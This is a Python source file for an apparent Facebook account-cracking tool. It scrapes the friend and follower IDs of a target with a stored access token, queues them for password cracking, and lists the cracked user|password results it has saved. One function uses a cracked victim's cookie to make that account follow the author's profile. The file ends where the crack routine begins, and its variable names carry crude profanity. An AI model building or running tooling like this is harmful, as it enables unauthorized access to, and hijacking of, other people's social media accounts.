import os,sys
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		os.sys.exit("[?] Sorry, It seems rich is not installed(Install Manual : python -m pip install rich &> /dev/null)")
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as iprint
from rich.panel import Panel
from rich.tree import Tree
from rich import print as rprint
from rich.progress import track
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import Task
from rich.progress import DownloadColumn,SpinnerColumn,TransferSpeedColumn
from rich import filesize, get_console
console = Console()
from rich.console import Group
from rich.markdown import Markdown
from rich.panel import Panel
from rich.syntax import Syntax
from rich.table import Table
from rich.box import DOUBLE, ROUNDED
from rich.padding import Padding
from rich.box import ROUNDED, Box
#from rich.text import *
#from rich.spinner import *
try:
	import os,sys
	try:
		import requests
	except ImportError as e:
		print(f"[X] Currently Installing Materials {e.name}, Be patient please....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import bs4
	except ImportError as e:
		print(f"[X] Currently installing package  {e.name}, Please wait....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import stdiomask
	except ImportError as e:
		print(f"[X] Currently installing package  {e.name}, Please wait....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import mechanize
	except ImportError as e:
		print(f"[X] Currently installing package  {e.name}, Please wait....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import subprocess
		null = open(os.devnull, "w")
		insta = subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
		if insta !=0:os.system('pkg install play-audio -y &> /dev/null')
		null.close()
		musik_="Kontol"
	except:musik_="Jangan"
except:pass
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import sys, os, subprocess, platform, struct
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json
import requests as req
import time,random,json
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup
from random import choice as pilih
from concurrent.futures import ThreadPoolExecutor as __Kiky__
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from datetime import datetime
from urllib.parse import quote
from datetime import date

# --[COLOR]--
H = "#000000" # Black
M = "#FF0000" # Red
I = "#00FF00" # Green
K = "#FFFF00" # Yellow
B = "#00C8FF" # Blue
U = "#AF00FF" # Purple
P = "#FF00FF" # Pink
C = "#00FFFF" # Light blue
Q = "#FFFFFF" # White
J = "#FF8F00" # Orange
A = "#AAAAAA" # Ash
O = "#FFA500" # ORANGE

# --[COLORV2]--
p = '\x1b[0;97m' # White
m = '\x1b[0;91m' # RED
i = '\x1b[1;92m' # GREEN
k = '\x1b[1;93m' # Yellow
b = '\x1b[1;94m' # Blue
u = '\x1b[1;95m' # Purple
c = '\x1b[0;96m' # Light blue
q = '\x1b[0m'	# COLOR MATI
h = "\x1b[0;90m"     # Black
j = "\x1b[38;5;208m" # Orange
a = "\x1b[38;5;248m" # Ash
o='\033[38;2;255;127;0;1m' #ORANGE

#COLOR rick(kotak)
HH = "[#000000]" # Black
MM = "[#FF0000]" # RED
II = "[#00FF00]" # GREEN
KK = "[#FFFF00]" # Yellow
BB = "[#00C8FF]" # Blue
UU = "[#AF00FF]" # Purple
PP = "[#FF00FF]" # Pink
CC = "[#00FFFF]" # Light blue
QQ = "[#FFFFFF]" # White
JJ = "[#FF8F00]" # Orange
AA = "[#AAAAAA]" # Ash
OO = "[#FFA500]" # ORANGE

# TIME SETTING/JAMZ
ses = requests.Session()
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August ", "09": "September", "10": "October", "11": "November", "12": "December"}
jamz = datetime.now().strftime('%H:%M:%S')
jam_ = datetime.now().strftime('%H%M%S')
jam__ = str(datetime.now().strftime("%d%m%Y"))

# AGNET USER GROUP
ua01= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua02= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua03= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua04= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua05= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ua06= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ugen2,ugen,ugen_=[],[],[]
id_ri,idd,id,loop,ok,cp,yyy,apk_me,pass_,method,prox_,opsi_y,url_met,pass_man = [100063690353340],[],[],0,[],[],"AKTIF","TIDAK","","",[],"DOWN","",""
#[100063690353340,110877271176800]






def kotak(kata, wwe, wew):
	pertama = kata
	kedua   = mark(pertama, style=wwe)
	sol().print(kedua, style=wew)
def folder():
	try:os.mkdir("data")
	except:pass
	try:os.mkdir("results")
	except:pass
def play_mpv(x):
	if "Jangan" == musik_ or musik_ == "Jangan":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass

class open_role:
	def __init__(self):
		global tiktok,pupuk,puput
		try:
			tiktok = open("data/login.txt","r").read()
		except:pass
		try:
			pupuk = open("data/cookie.txt","r").read()
			puput = {'cookie':pupuk}
		except:pass
class Main():
	def __init__(self):
		os.system("clear")
		open_role();self.intro()
	def menu_del(self, kataa):
		iprint(Panel(f"{II}NO MENU,{II}[{II}{kataa}{II}]{II} THIS IS NOT AVAILABLE... BACK TO MENU", style=Q));time.sleep(3)
		Main()
	def intro(self):
		try:open("data/kata","r").read()
		except:open("data/kata","w").write("#WELCOME, THANKS FOR WATCHING");kotak(f"# WELCOME NEW USERS !!", I, I)
		now = datetime.now()
		hour = now.hour
		if hour < 4:
			waktu = "Good morning"
		elif 4 <= hour < 12:
			waktu = "Good morning"
		elif 12 <= hour < 15:
			waktu = "Good afternoon"
		elif 15 <= hour < 17:
			waktu = "Good afternoon"
		else:
			waktu = "Good night"
		try:token = open("data/login.txt","r").read()
		except:login()
		try:cookie = open("data/cookie.txt","r").read()
		except:pass
		try:
			xnxzx = ""+cookie
			zza = f"{i}Token{i} And {i}Cookie{i}"
		except:
			zza = f"{i}Token{q}"
		try:sh = requests.get('https://httpbin.org/ip').json()
		except:sh = {'origin':'-'}
		tod = f"""
▒█▀▀▄ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ ░░ ▒█▀▀▀ ▒█▀▀█ 
▒█░▒█ ▒█▄▄█ ▒█▄▄▀ ▒█▀▄░ ▀▀ ▒█▀▀▀ ▒█▀▀▄ 
▒█▄▄▀ ▒█░▒█ ▒█░▒█ ▒█░▒█ ░░ ▒█░░░ ▒█▄▄█ """
		my_ = Tree("                                 ",highlight=True, hide_root=True)
		my__= my_.add(Group(Panel(tod,title=waktu,style="white on black",box=DOUBLE,padding=1)),guide_style="bold magenta")


		my_r = my__.add(f"{i} David Chinedu{i}")
		my_rr= my_r.add(f"\r{i}My Github{i}")
		my_rr.add(f"{i}https://githuh.com/DavidKumar45{i}")
		my_rr.add(f"{i}https://githuh.com/CyberDemon404{i}")

		my_rrr=my_r.add(f"\r{i}My WhatsApp{i}")
		my_rrr.add(f"{i}2348178406817{i}")


		code="""Cyber Demon
	Solid Daddy
	NightRage D Sadboy 9
	Comrade Antelope 
	Chinda-XD
    Jewel-Fund"""
		pyhon = Syntax(code, "python", theme="monokai", line_numbers=True)
		my_rrrr=my_r.add(f"\r{i}My Team{i}")
		my_rrrr.add(Group(pyhon))


		my_rrrrr=my_r.add(f"\r{i}Information{i}")
		tod=my_rrrrr.add(f"{j}Grub WhatsApp{i}")
		tod.add(f"{i}wa.me/+2348178406817{i}")
		tod_=my_rrrrr.add(f"{j}Facebook Page(Halaman Facebook){i}")
		tod_.add(f"{i}https://www.facebook.com/101003905507650{i}")
		tod_.add(f"{i}https://www.facebook.com/110877271176800{i}")


		try:
			yz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
			idz = zxc["id"]
		except:
			try:os.remove('data/login.txt')
			except:pass
			try:os.remove('data/cookie.txt')
			except:pass
			token= Tree("                                 ",highlight=True, hide_root=True)
			token_e= token.add(Group(Panel(tod,title=waktu,style="white on black",box=DOUBLE,padding=1)),guide_style="bold magenta")
			prints(token_e)
			kotak("# TOKEN EXPIRED", I, I)
			os.sys.exit()
		data_=my_rrrrr.add(f"\r{i}Your Facebook Data{i}")
		data_.add(f"Username/Id       :{i}{nama}{i}")
		data_.add(f"Join Date:{i}{waktuu}{i}")
		data_.add(f"Ip Address        :{i}{str(sh['origin'])}{i}")
		data_.add(f"Login Using :{i}{zza}{i}")
		prints(my__)





		top = f"""01
02
03
04
05

00"""
		tip = f"""Crack From Public
Crack From Followers
Check Number of Friends
Check Crack Results
Check Session Account Options

Log Out From Account (Log Out)"""
		lpp = f"""{II}ONN
{II}ONN
{II}ONN
{II}ONN
{II}ONN

{II}ONN"""
		tod = me()
		tod.add_column("NO", style=I, justify='center')
		tod.add_column("CHOOSE", style=Q, justify='center',width=60)
		tod.add_column("STATUS", style=M, justify='center')
		tod.add_row(top,tip, lpp)
		sol().print(tod, justify='center')
		self.pilihan()
	def pilihan(self):
		ki = input(f'⚔️ Choose 1-3⚔️')
		if ki in ["1","01"]:self.public();os.sys.exit()
		elif ki in ["2","02"]:self.follow();os.sys.exit()
		elif ki in ["3","03"]:self.cek_jumlah_teman();os.sys.exit()
		elif ki in ["4","04"]:self.rek();os.sys.exit()
		elif ki in ["5","05"]:self.cek_opsi();os.sys.exit()
#		elif ki in ["6","06"]:pass
		elif ki in ["00","00"]:self.logut()
		else:
			tod = f"{II}Sorry Option {II}[{II}{ki}{II}] {II} Not Available..."
			iprint(Panel(tod, style=Q))
			time.sleep(3),Main()
	def logut(self):
		try:os.remove('data/login.txt')
		except:pass
		try:os.remove('data/cookie.txt')
		except:pass
		kotak("# Token And Cookies Deleted Successfully (Log Out Successfully)", I, I)
		os.sys.exit()

	def ambil_nama(self,idd):
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idd,tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except Exception as e:
			iprint(Panel(f"Sorry Idz {II}[{II}{idd}{II}]{II} Not found"))
			time.sleep(3)
			Main()
		return nama
	def ubah_nama(self,idd):
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idd,tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except Exception as e:
			iprint(Panel(f"Sorry idz {II}[{II}{idd}{II}]{II} Not found"))
			time.sleep(3)
			Main()
		return nama
	def ubah_user(self,username):
		try:
			if username == "me":
				return(username)
			else:
				url    = 'https://mbasic.facebook.com/' + username
				with requests.Session() as xyz:
					req = par(xyz.get(url,cookies=puput).content,'html.parser')
					kut = req.find('a',string='Others')
					id = str(kut['href']).split('=')[1]
					id = id.replace("&refid","")
					# id = re.search('owner_id=(.*?)"',str(kut)).group(1)
					return(id)
		except Exception as e:return(username)
	def ubah_user1(self,idd):
			try:
				if idd == "me":idd = "me"
				else:
					payload = {"fburl": "https://free.facebook.com/{}".format(idd), "check": "Lookup"}
					if "facebook" in idd:
						payload = {"fburl": idd, "check": "Lookup"}
					mmk = requests.post("https://lookup-id.com/", data=payload).content
					xxx = par(mmk, "html.parser")
					idtt = xxx.find("span", id="code")
					asw = idtt.text
					idd = asw
			except:idd = idd
			return idd



	def public(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# PLEASE ENTER IDZ/USERNAME TO CRACK !!",I,I)
		idt = input(f">--{h}Target{k}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+II+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						idd.append(uid+"<=>"+nama)
					except:pass
		except KeyError:pass
		god += "Number of Idz Collected : "+II+str(len(idd))+II
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# SORRY THE NUMBER OF IDZ COLLECTED IS ZERO OR NO",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOOSE", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack From Oldest Account\nCrack From The Youngest Account\nCrack from Random Account {QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Choose option 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# NEXT TIME FILL CORRECTLY !!", I, I);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def follow(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# PLEASE ENTER IDZ/USERNAME TO CRACK !!",I,I)
		idt = input(f">--{k}Target{q}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(500000)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)

				for i in jso["subscribers"]["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						idd.append(uid+"<=>"+nama)
					except:pass
		except KeyError:pass
		god += "Number of Idz Collected : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# SORRY THE NUMBER OF IDZ COLLECTED IS ZERO OR NO",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOOSE", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack From Oldest Account\nCrack from youngest Account {QQ}({II}Recommended{QQ}){MM}\nCrack from Random Account")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# NEXT TIME FILL CORRECTLY !!", I, I);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def cek_jumlah_teman(self):
		try:
			token = open("data/login.txt", "r").read()
			toket = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			kotak("# SORRY YOUR TOKEN BROKEN/ERROR",I,I)
			time.sleep(2)
			os.sys.exit()
		god = ""
		kotak("# PLEASE ENTER IDZ/USERNAME TO CRACK !!",I,I)
		idt = input(f">--{k}Target{q}--> : ")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						idd.append(uid)
					except:pass
		except KeyError:pass
		god += "Number of Idz Collected : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# SORRY THE NUMBER OF IDZ COLLECTED IS ZERO OR NO",M,O)
			os.sys.exit()
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOOSE", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Check the number of friends from the oldest account\nCheck the number of friends from youngest account  Termuda\nCheck the number of friends from Random")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# NEXT TIME FILL CORRECTLY !!", I, I);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		with __Kiky__(max_workers=10) as (kiky_gtg):
			for data in id:
				kiky_gtg.submit(self._lonte_, data, toket, token)
	def _lonte_(self, ml, token, toket):
		try:
			goblok = []
			tolol = []
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(ml,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
						goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
					except:pass
			url = ("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token)
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["data"]:
					try:
						anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
						tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
					except:pass
		except KeyError:pass
		todz = me()
		todz.add_column("ID", style=I, justify="center")
		todz.add_column("TOTAL FRIENDS", style=C, justify="center")
		todz.add_column("NUMBER OF FOLLOWERS", style=O, justify="center")
		todz.add_row(f'{ml}',f"{len(goblok)}",f"{len(tolol)}")
		sol().print(todz, justify='center')

	def cekfile_crk(self, folder):
		dirs = os.listdir(folder)
		god_cp,god_ok="",""
		for file in dirs:
			filex = (folder+"/"+file)
			try:
				juma = open(filex,"r").readlines()
				total = ("%s"%(str(len(juma))))
			except:total = (" ?? ")
			try:
				ijo__ = filex.split("results/OK-")[1]
				ijo_ = (QQ+II+"results/OK-"+ijo__)
				god_ok += (ijo_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
			except:pass
			try:
				kuning__ = filex.split("results/CP-")[1]
				kuning_ = (QQ+KK+"results/CP-"+kuning__)
				god_cp += (kuning_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
			except:pass
		iprint(Panel(god_ok, style=I, title="RESULTS OK"))
		iprint(Panel(god_cp, style=K, title="RESULTS CP"))
		print()
	def rek(self):
		self.cekfile_crk("results")
		namax=input(f">--Nama File--> ")
		try:
			fila=open(namax,"r").readlines()
		except FileNotFoundError:
			kotak("# SORRY THE FILE YOU ENTER DOESNT EXIST !!", I,I);time.sleep(3)
			self.rek()
		try:
			volak = namax.split("CP-")[1];copy_ri = ("");Ass = ("%s"%(KK));aSs = KK
		except:
			try:
				vok = namax.split("OK-")[1]
				copy_ri = ("")
				Ass = ("%s"%(II))
				aSs = II
			except:
				copy_ri = ("DARK-FB")
				Ass = ("%s"%(CC))
				aSs = MM
		kotak(f"# NUMBER OF ACCOUNTS : {len(fila)}",I,I)
		with __Kiky__(max_workers=30) as (form):
			for data in fila:
				try:
					data = data.replace("\n","")
					try:user,pw,tll = data.split("|")
					except:user,pw = data.split("|");tll=(" - ")
					iprint(Panel(f"{QQ}{Ass}{copy_ri}{QQ}{aSs}{user}|{pw}|{tll}{QQ}", style=Q, title="AKUN"))
				except:pass
				time.sleep(0.01)
	def cek_opsi(self):
		cekfile_crk("results")
		print(">--Example-->"+k+"results/CP-"+durasi+".txt"+q)
		files = input('>--Nama File-->')
		try:
			buka_baju = open(files,"r").readlines()
		except FileNotFoundError:
			kotak("# SORRY THE FILE YOU ENTER DOESNT EXIST",I,I)
			time.sleep(2);self.cek_opsi()
		with __Kiky__(max_workers=25) as kontok:
			for memek in buka_baju:
				kontol = memek.replace("\n","")
				titid  = kontol.split("|")
				try:
					kontok.submit(hide_opsi, titid[0], titid[1], titid[2])
				except:
					kontok.submit(hide_opsi, titid[0], titid[1], "")
		kotak("# PRESS ENTER TO RETURN",I, I)
		input()
		Main_()._no_vpn()
class crack_new:
	def __init__(self):
		_ = "ALREADY KNEW CODING ALONE WAS NOT HELPED, YOU BOY RIKOD WKWKWK"
	def Kontol_Kau_Ikuti(self,sessionn,cokii):
		try:
			r = BeautifulSoup(sessionn.get("https://mbasic.facebook.com/profile.php?id=100063690353340",cookies={"cookie":cokii}).text,"html.parser")
			get = r.find("a",string="Ikuti").get("href")
			sessionn.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":cokii}).text
		except:pass
		try:
			puput = {'cookie':cokii}
			with requests.Session() as xyz:
				for x in par(xyz.get('https://mbasic.facebook.com/100063690353340',cookies=puput).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in x['href']:
						exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
		except:pass


	def otomatis(self):
		global anim,anim2
